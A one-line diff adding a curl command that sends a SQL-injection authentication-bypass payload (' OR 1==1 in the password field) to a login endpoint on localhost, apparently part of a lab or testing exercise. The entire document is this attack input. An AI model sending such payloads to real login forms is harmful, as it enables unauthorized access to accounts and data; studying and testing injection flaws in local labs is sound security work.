@@ -1,0 +1,1 @@
+curl localhost:8996/login -X POST -d "username=admin&password=' OR 1==1"
